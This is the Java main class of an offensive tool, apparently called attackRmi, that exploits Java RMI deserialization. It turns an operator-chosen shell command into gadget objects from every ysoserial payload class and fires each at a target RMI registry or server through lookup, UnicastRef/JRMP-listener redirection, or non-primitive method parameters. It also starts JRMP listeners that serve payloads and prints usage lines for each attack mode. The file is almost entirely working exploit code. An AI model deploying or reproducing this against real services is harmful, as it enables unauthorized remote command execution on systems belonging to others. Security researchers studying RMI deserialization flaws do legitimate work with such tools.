package com.wu.attackRmi;

import com.wu.attackRmi.Exploit.AttackRegistryByLookup;
import com.wu.attackRmi.Exploit.AttackRegistryByLookupAndUnicastRefRemoteObject;
import com.wu.attackRmi.Exploit.AttackServerByNonPrimitiveParameter;
import ysoserial.payloads.ObjectPayload;
import ysoserial.exploit.JRMPListener;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Main {

    public static void main(String[] args) throws Exception{
        if (args.length < 4) {
            printUsage();
            System.exit(64);
        }

        String attackMethod = args[0];
        String registryHost = args[1];
        int registryPort = Integer.parseInt(args[2]);
        String command;
        String JRMPListenHost;
        int JRMPListenPort;
        int startPort;
        HashMap<String, Object> payloadObjects;




        switch (attackMethod){
            case "DOL":
                command = args[3];
                payloadObjects = getpayloadObjects(command);
                for (Map.Entry<String, Object> entry : payloadObjects.entrySet()) {
                    System.out.println("try gadget: " + entry.getKey());
                    AttackRegistryByLookup.attack(registryHost, registryPort, entry.getValue());
                }
                break;
            case "LAUS":
                String serverIp = args[3];
                startPort = Integer.parseInt(args[4]);
                command = args[5];
                payloadObjects = getpayloadObjects(command);
                int [] ports = new int [payloadObjects.size()];
                int port = startPort;
                //payloadObject index
                int oi = 0;
                // port offset
                int pi = 0;
                while (oi < ports.length){
                    port = port + pi;
                    Object payloadObject = payloadObjects.values().toArray()[oi];
                    try{
                        JRMPListener c = new JRMPListener(port, payloadObject);
                        new Thread(c).start();
                        oi = oi + 1;
                        pi = pi + 1;
                        ports[oi] = port;
                        System.out.println(payloadObjects.keySet().toArray()[oi] + "Listen on " + port);
                        AttackRegistryByLookupAndUnicastRefRemoteObject.attack(registryHost, registryPort, serverIp, port);
                    }catch (Exception e){
                        e.printStackTrace();
                        port = port + 1;
                    }
                }
                break;
            case "LAU":
                JRMPListenHost = args[3];
                JRMPListenPort = Integer.parseInt(args[4]);
                AttackRegistryByLookupAndUnicastRefRemoteObject.attack(registryHost, registryPort, JRMPListenHost, JRMPListenPort);
                break;
            case "NPP":
                String name = args[3];
                String methodSignature = args[4];
                command = args[5];
                payloadObjects = getpayloadObjects(command);
                for (Map.Entry<String, Object> entry : payloadObjects.entrySet()) {
                    System.out.println("try gadget: " + entry.getKey());
                    AttackServerByNonPrimitiveParameter.attack(registryHost, registryPort, name, methodSignature, entry.getValue());
                }
                break;
            default:
                printUsage();
        }
    }

    private static HashMap getpayloadObjects(String cmd) throws Exception{
        ObjectPayload payload;
        Object payloadObject;
        HashMap<String, Object> payloadObjects = new HashMap<String, Object>();
        List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            try{
                payload = (ObjectPayload) payloadClass.newInstance();
                payloadObject = payload.getObject(cmd);
                payloadObjects.put(payloadClass.getSimpleName(), payloadObject);
            }catch (Exception e){
                //e.printStackTrace();
            }
        }
        return payloadObjects;
    }

    private static void printUsage() {
        System.err.println("\033[32;1mByDGC OR ByLookup\033[0m");
        System.err.println("Usage: java -jar attackRmi.jar DOL [registryHost] [registryPort] '[command]'\n");

        System.err.println("\033[32;1mByLookupAndUnicastRef OR ByLookupAndUnicastRefRemoteObject\033[0m");
        System.err.println("Usage: java -jar attackRmi.jar LAU [registryHost] [registryPort] [JRMPListenHost] [JRMPListenPort]");
        System.err.println("Usage: java -jar attackRmi.jar LAUS [registryHost] [registryPort] [serverIp] [startPort] '[command]' (run at server)\n");

        System.err.println("\033[32;1mByNonPrimitiveParameter\033[0m");
        System.err.println("Usage: java -jar attackRmi.jar NPP [registryHost] [registryPort] [name] '[methodSignature]' '[command]'\n");


        System.err.println("\033[36;1mAttackRegistryByDGC\033[0m");
        System.err.println("Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByDGC [registryHost] [registryPort] [payload] '[command]' \n");

        System.err.println("\033[36;1mAttackRegistryByLookup\033[0m");
        System.err.println("Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByLookup [registryHost] [registryPort] [payload] '[command]'\n");

        System.err.println("\033[36;1mAttackRegistryByLookupAndUnicastRef\033[0m");
        System.err.println("Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByLookupAndUnicastRef [registryHost] [registryPort] [JRMPListenHost] [JRMPListenPort]\n");

        System.err.println("\033[36;1mAttackRegistryByLookupAndUnicastRefRemoteObject\033[0m");
        System.err.println("Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByLookupAndUnicastRefRemoteObject [registryHost] [registryPort] [JRMPListenHost] [JRMPListenPort]\n");

        System.err.println("\033[36;1mAttackServerByNonPrimitiveParameter\033[0m");
        System.err.println("Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackServerByNonPrimitiveParameter [registryHost] [registryPort] [name] '[methodSignature]' [payloadType] '[command]'\n");
    }
}
